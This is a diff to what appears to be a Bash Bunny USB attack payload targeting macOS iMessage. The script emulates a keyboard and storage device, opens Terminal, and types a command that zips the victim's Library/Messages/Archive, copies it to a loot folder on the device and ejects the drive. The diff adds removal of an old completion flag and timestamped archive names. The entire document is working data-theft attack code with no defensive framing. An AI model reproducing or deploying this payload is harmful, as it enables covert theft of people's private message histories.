@@ -7,12 +7,16 @@
 # Target:        MacOS (iMessage)
 # Attackmodes:   HID, STORAGE
 
-# options - Define the name of the BashBunny volume
+#options - Define the name of the BashBunny volume
 bashbunnyvolume=BASHBUNNY
 
 LED SETUP
 mkdir /root/udisk/loot/iMessage
 lootdir=/Volumes/$bashbunnyvolume/loot/iMessage/
+if [ -f /root/udisk/loot/iMessage/finished ]
+then
+	rm /root/udisk/loot/iMessage/finished
+fi
 
 #### INITIAL STAGE #####
 
@@ -20,8 +24,9 @@ ATTACKMODE HID STORAGE
 LED ATTACK
 RUN OSX terminal
 Q WAIT 500
-Q STRING 'zip -r messages.zip Library/Messages/Archive/*;mv messages.zip '$lootdir';touch '$lootdir'finished;diskutil eject /Volumes/BASHBUNNY;exit'
+Q STRING 'timestamp=$(date +"%d%m%y-%H%M");zip -r messages-$timestamp.zip Library/Messages/Archive/*;mv messages-$timestamp.zip '$lootdir';touch '$lootdir'finished;diskutil eject /Volumes/BASHBUNNY;exit'
 Q ENTER
+
 
 ##### WAITING FOR ATTACK TO END ########
 
